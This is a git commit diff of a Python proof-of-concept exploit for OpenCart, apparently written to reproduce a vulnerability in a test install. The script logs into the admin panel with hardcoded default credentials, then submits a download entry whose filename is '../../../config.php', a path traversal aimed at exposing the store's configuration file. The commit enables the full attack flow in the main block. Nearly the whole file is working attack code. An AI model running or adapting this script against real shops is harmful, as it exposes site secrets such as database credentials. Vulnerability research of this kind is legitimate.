0da20ee357eb85c4512b79ec94dfc9f55716ab2c
sakuratimo <787886660@qq.com>
2020-04-19 11:57:43 +0800

    change poc_addfile

--- resource/poc.py
+++ resource/poc.py
@@ -5,7 +5,7 @@ host = "opencart"
 
 def loginad():
     session = requests.session()
-    burp0_url = "https://opencart66.com:443/admin/index.php?route=common/login"
+    burp0_url = "https://"+host+":443/admin/index.php?route=common/login"
     burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "close", "Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e41da1a409b4", "Upgrade-Insecure-Requests": "1"}
     burp0_data = "-----------------------------7e41da1a409b4\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nuser\r\n-----------------------------7e41da1a409b4\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nbitnami1\r\n-----------------------------7e41da1a409b4--\r\n"
     res=session.post(burp0_url, headers=burp0_headers, data=burp0_data,allow_redirects=False,verify=False)
@@ -14,7 +14,7 @@ def loginad():
     token=location[-32:]
     print(cookies)
     print(token)
-    return  cookies token
+    return  cookies,token,session
     # r=requests.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False)
 #cookies=r.cookies.get_dict()
 
@@ -37,15 +37,17 @@ def loginad():
 
 
 def addfile(adcookies,adtoken):
-
-    #print(r.status_code)
+    session = requests.session()
+    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download/add&user_token="+adtoken
+    burp0_cookies = {"OCSESSID": adcookies}
+    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e4812b409b4", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
+    burp0_data = "-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"download_description[1][name]\"\r\n\r\nfile_poc_2020\r\n-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../config.php\r\n-----------------------------7e4812b409b4\r\nContent-Disposition: form-data; name=\"mask\"\r\n\r\n1234\r\n-----------------------------7e4812b409b4--\r\n"
+    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False,verify=False)
     
-
     burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
-    burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
-    burp0_headers = {"Origin": "https://"+host, "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
-    r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
-    print("add file")
+    r_check=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,allow_redirects=False,verify=False)
+    print("add download file")
+    print(r_check.text)
     return r_check
     #print(r.status_code)
     #print(r.text)
@@ -63,12 +65,12 @@ def check_poc(r_check):
 if __name__ == "__main__":
     n=loginad()
     adcookies=n[0]
-    adtoken=n[1]
-    # print(adcookies)
-    # print(adtoken)   
-    # r_check=addfile(adcookies,adtoken)
-    # result=check_poc(r_check)
-    # exit(result)
+    adtoken=n[1] 
+    session=n[2]
+    r_check=addfile(adcookies,adtoken)
+  
+    result=check_poc(r_check)
+    exit(result)
     
  
 
